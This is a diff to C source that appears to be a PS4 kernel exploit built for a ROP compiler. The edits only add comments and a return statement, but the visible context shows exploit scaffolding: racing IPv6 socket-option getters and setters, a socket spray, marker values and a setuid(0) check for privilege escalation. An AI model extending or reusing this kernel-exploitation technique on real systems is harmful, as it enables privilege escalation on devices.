@@ -23,7 +23,7 @@ int printf_(const char* fmt, ...) { return 0; }
 #define IPV6_2292PKTINFO    19
 #define IPV6_2292PKTOPTIONS 25
 
-// ps4-rop-8cc generates thread-unsafe code, so each racing thread 
+// The ps4-rop-8cc generates thread-unsafe code, so each racing thread 
 // needs its own get_tclass function
 #define GET_TCLASS(name) int name(int s) {\
     int v;\
@@ -40,6 +40,7 @@ GET_TCLASS(get_tclass_3)
 int set_tclass(int s, int val) {
     if (setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val)))
         *(volatile int*)0;
+    return 0;
 }
 
 #define TCLASS_MASTER   0x13370000
@@ -62,13 +63,14 @@ struct opaque {
     int* spray_sock; // pointer to array of sprayed sock's 
 };
 
+// Gets the routing header from socket
 int get_rthdr(int s, char* buf, int len) {
     socklen_t l = len;
     if (getsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, &l))
         *(volatile int*)0;
     return l;
 }
-
+// Gets the packet information from socket
 int get_pktinfo(int s, char* buf) {
     socklen_t l = sizeof(struct in6_pktinfo);
     if (getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l))
@@ -224,7 +226,10 @@ void pin_to_cpu(int cpu) {
 }
 
 int main() {
+    // Check if we can escalate privileges to root (UID 0).
+    // If not, return 179 (which sets read_ptr_at(main_ret) to 179)
     if (!setuid(0)) return 179;
+    // Spray 16 sockets
     for (int i = 0; i < 16; i++)
         new_socket();
 
